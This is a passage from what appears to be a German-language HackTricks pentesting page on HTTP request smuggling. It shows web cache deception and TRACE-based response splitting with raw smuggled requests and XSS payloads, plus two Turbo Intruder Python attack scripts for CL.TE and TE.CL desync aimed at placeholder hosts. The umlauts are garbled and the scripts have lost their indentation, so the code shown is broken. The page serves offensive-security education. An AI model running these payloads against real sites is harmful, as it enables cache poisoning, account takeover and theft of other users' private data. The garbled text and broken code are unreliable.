> * Bei **Web-Cache-Poisoning** verursacht der Angreifer, dass die Anwendung sch√§dliche Inhalte im Cache speichert, und diese Inhalte werden aus dem Cache an andere Anwendungsbenutzer bereitgestellt.
> * Bei **Web-Cache-T√§uschung** verursacht der Angreifer, dass die Anwendung sensible Inhalte eines anderen Benutzers im Cache speichert, und der Angreifer ruft dann diese Inhalte aus dem Cache ab.

Der Angreifer erstellt eine geschmuggelte Anfrage, die sensible benutzerspezifische Inhalte abruft. Betrachten Sie das folgende Beispiel:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Wenn diese geschmuggelte Anfrage einen Cache-Eintrag f√ºr statische Inhalte (z. B. `/someimage.png`) vergiftet, k√∂nnten die sensiblen Daten des Opfers von `/private/messages` unter dem Cache-Eintrag f√ºr statische Inhalte gespeichert werden. Folglich k√∂nnte der Angreifer potenziell diese zwischengespeicherten sensiblen Daten abrufen.

### Missbrauch von TRACE √ºber HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In diesem Beitrag**](https://portswigger.net/research/trace-desync-attack) wird vorgeschlagen, dass es m√∂glich sein k√∂nnte, die Methode TRACE zu missbrauchen, wenn der Server diese aktiviert hat, indem man HTTP Request Smuggling verwendet. Dies liegt daran, dass diese Methode jeden Header, der an den Server gesendet wird, als Teil des K√∂rpers der Antwort zur√ºckgibt. Zum Beispiel:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Wird eine Antwort senden wie:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Ein Beispiel, wie man dieses Verhalten ausnutzen kann, w√§re, zuerst eine **HEAD-Anfrage zu schmuggeln**. Diese Anfrage wird nur mit den **Headern** einer GET-Anfrage (**`Content-Type`** unter ihnen) beantwortet. Und sofort nach dem HEAD eine TRACE-Anfrage zu schmuggeln, die die gesendeten Daten **reflektiert**.\
Da die HEAD-Antwort einen `Content-Length`-Header enthalten wird, wird die **Antwort der TRACE-Anfrage als der K√∂rper der HEAD-Antwort behandelt, wodurch beliebige Daten** in der Antwort reflektiert werden. \
Diese Antwort wird an die n√§chste Anfrage √ºber die Verbindung gesendet, sodass dies **zum Beispiel in einer zwischengespeicherten JS-Datei verwendet werden k√∂nnte, um beliebigen JS-Code einzuschleusen**.

### Missbrauch von TRACE √ºber HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Es wird empfohlen, [**diesen Beitrag**](https://portswigger.net/research/trace-desync-attack) zu verfolgen, um eine weitere M√∂glichkeit zum Missbrauch der TRACE-Methode zu sehen. Wie kommentiert, ist es durch das Schmuggeln einer HEAD-Anfrage und einer TRACE-Anfrage m√∂glich, **einige reflektierte Daten** in der Antwort auf die HEAD-Anfrage zu **steuern**. Die L√§nge des K√∂rpers der HEAD-Anfrage wird im Wesentlichen im Content-Length-Header angegeben und wird durch die Antwort auf die TRACE-Anfrage gebildet.

Daher w√§re die neue Idee, dass es, wenn man diesen Content-Length und die in der TRACE-Antwort gegebenen Daten kennt, m√∂glich ist, die TRACE-Antwort so zu gestalten, dass sie eine g√ºltige HTTP-Antwort nach dem letzten Byte des Content-Length enth√§lt, was es einem Angreifer erm√∂glicht, die Anfrage zur n√§chsten Antwort vollst√§ndig zu steuern (was verwendet werden k√∂nnte, um eine Cache-Vergiftung durchzuf√ºhren).

Beispiel:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Wird diese Antworten generieren (beachten Sie, wie die HEAD-Antwort eine Content-Length hat, wodurch die TRACE-Antwort Teil des HEAD-K√∂rpers wird, und sobald die HEAD Content-Length endet, wird eine g√ºltige HTTP-Antwort geschmuggelt):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(‚Äúarbitrary response‚Äù)</script>
```
### Waffentechniken f√ºr HTTP Request Smuggling mit HTTP Response Desynchronisation

Hast du eine HTTP Request Smuggling-Sicherheitsanf√§lligkeit gefunden und wei√üt nicht, wie du sie ausnutzen kannst? Probiere diese anderen Methoden der Ausnutzung:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Weitere HTTP Request Smuggling Techniken

* Browser HTTP Request Smuggling (Client-Seite)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling bei HTTP/2 Downgrades

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Turbo Intruder Skripte

### CL.TE

Von [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Von: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Tools

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Dieses Tool ist ein grammatikbasiertes HTTP-Fuzzer, das n√ºtzlich ist, um seltsame Unterschiede beim Request Smuggling zu finden.

## References

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
